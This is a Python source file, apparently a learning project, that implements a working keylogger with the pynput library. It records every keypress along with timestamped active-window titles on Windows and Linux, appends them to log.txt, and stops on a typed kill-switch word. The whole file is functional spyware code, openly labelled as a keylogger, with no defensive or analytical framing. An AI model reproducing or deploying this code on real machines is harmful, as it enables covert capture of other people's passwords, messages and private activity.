import os
import platform
import subprocess
from datetime import datetime
from pynput import keyboard

# this is where the kill switch is 
#STOP_KEY = keyboard.Key.esc
# instead of using key as a kill swtich lets use a string
typed_chars = ""


# here im initializing the variables
current_window = ""
log_file = "log.txt"

# get the active window title according to the OS
def get_active_window_title():
    system = platform.system()

    if system == "Windows":
        # win32gui helps to get window ttle for windows
        try:
            import win32gui
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        except Exception:
            return "Unknown Window"
        
    elif system == "Linux":
        # xdotool for linux
        try:
            window = subprocess.check_output(["xdotool", "getactivewindow", "getwindowname"])
            return window.decode("utf-8").strip()
        except Exception:
            return "Unknown Window"
    
    else:
        return "Unsupported OS"

# here goes logging all the keypresses
def log_key(key):
    global current_window

    # log the current window
    active_window = get_active_window_title()

    # when window changes, log the new title with timestamp
    if active_window != current_window:
        current_window = active_window
        log(f"\n\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] - Window: {current_window}\n")

    # format the key for logging
    try:
        log(f"{key.char}")
    except AttributeError:
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "\t",
        }

        if key in special_keys:
            log(special_keys[key])
        else:
            log(f"[{key.name}]")

#  write to the log file
def log(text):
    with open(log_file, "a") as f:
        f.write(text)

# listener callback
def on_press(key):
    global typed_chars

    try:
        typed_chars += key.char
        if "stopthecap" in typed_chars:
            print("Kill switch word detected. Keylogger stopped.")
            return False  # stop the listener
        if len(typed_chars) > 20:
            typed_chars = typed_chars[-20:]  # keep buffer size reasonable
    except AttributeError:
        # if key has no char (like Shift, Ctrl, etc.), just ignore for buffer
        pass

    log_key(key)    # updated kill switch

# start the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger started")
    listener.join()
